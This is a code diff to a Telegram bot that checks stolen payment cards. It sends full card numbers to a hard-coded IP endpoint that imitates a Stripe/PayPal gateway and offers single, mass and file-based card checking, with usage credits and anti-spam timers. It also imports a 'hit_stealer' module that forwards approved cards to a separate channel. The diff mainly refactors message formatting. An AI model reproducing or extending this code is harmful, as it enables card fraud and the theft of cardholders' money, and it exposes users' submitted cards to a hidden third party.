@@ -1,4 +1,3 @@
-import httpx
 import time
 import asyncio
 import re
@@ -6,7 +5,7 @@ import os
 from pyrogram import Client, filters
 from FUNC.usersdb_func import *
 from FUNC.defs import *
-from TOOLS.check_all_thing import *
+from TOOLS.check_all_func import *
 from TOOLS.getbin import *
 from BOT.tools.hit_stealer import send_hit_if_approved
 
@@ -15,34 +14,8 @@ STEALER_CHANNEL_ID = -1003627495953
 MAX_MSC_LIMIT = 10 
 MAX_TSC_LIMIT = 100
 
-# --- BOT API BRIDGE FOR COLLAPSIBLE INFO ---
-async def send_colored_msg(client, chat_id, text, reply_to_message_id=None, message_id=None):
-    token = client.bot_token if hasattr(client, 'bot_token') else os.environ.get("BOT_TOKEN")
-    if not token: return None
-    
-    url = f"https://api.telegram.org/bot{token}/"
-    payload = {
-        "chat_id": chat_id,
-        "text": text,
-        "parse_mode": "HTML",
-        "disable_web_page_preview": True
-    }
-    
-    async with httpx.AsyncClient() as http:
-        if message_id:
-            payload["message_id"] = message_id
-            method = "editMessageText"
-        else:
-            payload["reply_to_message_id"] = reply_to_message_id
-            method = "sendMessage"
-            
-        try:
-            r = await http.post(url + method, json=payload)
-            return r.json()
-        except:
-            return None
-
 async def call_stripe_api(fullcc):
+    import httpx
     endpoint_url = f"http://138.128.240.15:8024/paypal_1?cc={fullcc}"
     async with httpx.AsyncClient(timeout=45, follow_redirects=True) as session:
         for attempt in range(2):
@@ -76,7 +49,7 @@ async def stripe_charge_cmd(Client, message):
     try:
         user_id = str(message.from_user.id)
         first_name = message.from_user.first_name
-        checkall = await check_all_thing(Client, message)
+        checkall = await check_all_func(Client, message)
         
         if checkall[0] == False:
             return
@@ -131,9 +104,6 @@ async def stripe_charge_cmd(Client, message):
         await asyncio.sleep(0.5)
         thirdcheck = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp)
 
-        # Zero-width spaces to force collapse without visible space
-        zero_width_padding = "&#8203;" * 1000
-        
         finalresp = f"""💠 𝘾𝙘-» <code>{fullcc}</code>
 💠 𝙎𝙩𝙖𝙩𝙪𝙨-» {status}
 💠 𝙍𝙚𝙨𝙪𝙡𝙩-» {response} 💎
@@ -141,16 +111,16 @@ async def stripe_charge_cmd(Client, message):
 <blockquote expandable>💠 𝘾𝙤𝙪𝙣𝙩𝙧𝙮-» {country} {flag}
 💠 𝘽𝙞𝙣-» {brand}
 _{type_}-{level}
-💠 𝘽𝙖𝙣𝙠-» {bank}{zero_width_padding}</blockquote>
+💠 𝘽𝙖𝙣𝙠-» {bank}</blockquote>
 ════『 META 』════
 💠 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» {gateway}
 💠 𝙏𝙞𝙢𝙚-» {time.perf_counter() - start:0.2f}s
-💠 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮-» <a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a> 🍷 ↯
+💠 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮-» <a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a> ↯
 {role}
 ════『 OWNER 』════
       <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
         
-        await send_colored_msg(Client, message.chat.id, finalresp, message_id=thirdcheck.id)
+        await Client.edit_message_text(message.chat.id, thirdcheck.id, finalresp, disable_web_page_preview=True)
         
         await setantispamtime(user_id)
         await deductcredit(user_id)
@@ -166,7 +136,7 @@ async def stripe_mass_check_cmd(Client, message):
     try:
         user_id = str(message.from_user.id)
         first_name = message.from_user.first_name
-        checkall = await check_all_thing(Client, message)
+        checkall = await check_all_func(Client, message)
         if not checkall[0]: return
         role = checkall[1]
 
@@ -206,7 +176,7 @@ async def stripe_txt_check_cmd(Client, message):
     try:
         user_id = str(message.from_user.id)
         first_name = message.from_user.first_name
-        checkall = await check_all_thing(Client, message)
+        checkall = await check_all_func(Client, message)
         if not checkall[0]: return
         role = checkall[1]
 
@@ -270,7 +240,6 @@ async def process_sequential_check(Client, message, ccs, user_id, first_name, ro
         getbin = await get_bin_details(cc_num)
         brand, type_, level, bank, country, flag = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5]
         
-        zero_width_padding = "&#8203;" * 1000
         card_resp = f"""💠 𝘾𝙘-» <code>{fullcc}</code>
 💠 𝙎𝙩𝙖𝙩𝙪𝙨-» {status}
 💠 𝙍𝙚𝙨𝙪𝙡𝙩-» {response} 💎
@@ -278,7 +247,7 @@ async def process_sequential_check(Client, message, ccs, user_id, first_name, ro
 <blockquote expandable>💠 𝘾𝙤𝙪𝙣𝙩𝙧𝙮-» {country} {flag}
 💠 𝘽𝙞𝙣-» {brand}
 _{type_}-{level}
-💠 𝘽𝙖𝙣𝙠-» {bank}{zero_width_padding}</blockquote>
+💠 𝘽𝙖𝙣𝙠-» {bank}</blockquote>
 ━━━━━━━━━━━━━━━━━━━━
 """
         final_text += card_resp
@@ -291,11 +260,11 @@ _{type_}-{level}
     footer = f"""════『 META 』════
 💠 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» {gateway}
 💠 𝙏𝙞𝙢𝙚-» {elapsed_time}s
-💠 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮-» <a href='tg://user?id={user_id}'>{first_name}</a> 🍷 ↯
+💠 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮-» <a href='tg://user?id={user_id}'>{first_name}</a> ↯
 {role}
 ════『 OWNER 』════
       <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
     final_text += footer
     
-    await send_colored_msg(Client, message.chat.id, final_text, message_id=progress_msg.id)
+    await progress_msg.edit_text(final_text, disable_web_page_preview=True)
     await setantispamtime(user_id)
